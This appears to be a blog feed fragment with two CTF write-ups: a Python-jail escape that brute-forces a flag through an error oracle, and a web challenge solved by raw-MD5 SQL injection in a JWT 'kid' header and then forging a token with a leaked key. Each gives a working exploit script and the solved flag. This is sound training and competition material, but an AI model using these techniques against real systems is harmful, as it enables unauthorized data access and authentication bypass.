<h1 id="ok-nice-misc">ok-nice (misc)</h1>

<p>python jail</p>

<h2 id="solution">Solution</h2>

<p>Very limited range of options, nothing gets printed other than
<code class="language-plaintext highlighter-rouge">ok-nice</code> or <code class="language-plaintext highlighter-rouge">error</code>.</p>

<p>So the idea is to use the error as an oracle and brute force every char.</p>

<p>The main thing we are looking for is how to generate integers, so we can both index
flag and compare it to the result of ord.</p>

<p>Both <code class="language-plaintext highlighter-rouge">flag[True]</code> or <code class="language-plaintext highlighter-rouge">flag[False]</code> work.</p>

<p>True and False also work for generating integers:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="bp">True</span> <span class="o">+</span> <span class="bp">True</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span>
</code></pre></div></div>

<p>So now we can both index and compare two chars, something like:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="bp">True</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="bp">True</span><span class="o">+</span><span class="bp">True</span><span class="p">)</span> <span class="c1"># checks if flag[1] == '\x02'
</span></code></pre></div></div>

<p>Now we just need to throw an error whenever they match</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">True</span> <span class="o">/</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="bp">True</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="bp">True</span><span class="o">+</span><span class="bp">True</span><span class="p">))</span> <span class="c1"># division by zero when they match
</span></code></pre></div></div>

<p>Then just loop through every idx and every char.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ok-nice.chal.imaginaryctf.org"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">"True+"</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">get_idx</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">"True+"</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">build_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s">"ord(flag[True])/((</span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s">)-ord(flag[</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">]))"</span>

<span class="kn">import</span> <span class="nn">string</span><span class="p">,</span> <span class="n">time</span>

<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">get_idx</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">idx</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter input: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.100</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="k">if</span> <span class="s">"error"</span> <span class="ow">in</span> <span class="n">out</span><span class="p">.</span><span class="n">decode</span><span class="p">():</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">char</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[18]: go.py:45: flag=</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">ictf{0k_n1c3_7f4d3e5a6b}</code></p>

<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">fare-evasion - UIUCTF 2024</title><link href="https://shafouz.github.io/2024/06/29/fare-evasion.html" rel="alternate" type="text/html" title="fare-evasion - UIUCTF 2024" /><published>2024-06-29T04:00:00+00:00</published><updated>2024-06-29T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/06/29/fare-evasion</id><content type="html" xml:base="https://shafouz.github.io/2024/06/29/fare-evasion.html"><![CDATA[<p>https://ctftime.org/event/2275</p>

<h1 id="fare-evasion-web">fare-evasion (web)</h1>

<p>Unusual sqli challenge</p>

<h2 id="solution">Solution</h2>
<p>The bug happens because of not calling <code class="language-plaintext highlighter-rouge">.hex()</code> on the result of the md5
So if we can find some hash with <code class="language-plaintext highlighter-rouge">'1=1</code> or something like that we can dump the whole db
Fortunately someone already wrote about that a decade ago:
https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"https://fare-evasion.chal.uiuc.tf/pay"</span>

<span class="n">sqli</span> <span class="o">=</span> <span class="s">'129581926211651571912466741651878684928'</span>

<span class="n">j</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
    <span class="p">{</span><span class="s">"type"</span><span class="p">:</span> <span class="s">"passenger"</span><span class="p">},</span>
    <span class="n">key</span><span class="o">=</span><span class="s">'a_boring_passenger_signing_key_?'</span><span class="p">,</span>
    <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"kid"</span><span class="p">:</span> <span class="n">sqli</span><span class="p">,</span> <span class="s">"typ"</span><span class="p">:</span> <span class="s">"JWT"</span><span class="p">},</span>
<span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'access_token'</span><span class="p">:</span> <span class="n">j</span><span class="p">})</span>

<span class="n">ck</span> <span class="o">=</span> <span class="s">"conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e"</span>

<span class="n">j</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
    <span class="p">{</span><span class="s">"type"</span><span class="p">:</span> <span class="s">"passenger"</span><span class="p">},</span>
    <span class="n">key</span><span class="o">=</span><span class="n">ck</span><span class="p">,</span>
    <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"kid"</span><span class="p">:</span> <span class="s">"conductor_key"</span><span class="p">,</span> <span class="s">"typ"</span><span class="p">:</span> <span class="s">"JWT"</span><span class="p">},</span>
<span class="p">)</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'access_token'</span><span class="p">:</span> <span class="n">j</span><span class="p">})</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[2]: lab.py:28: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">uiuctf{sigpwny_does_not_condone_turnstile_hopping!}</code></p>

<p>shafouz 2024/06/29</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2275]]></summary></entry></feed>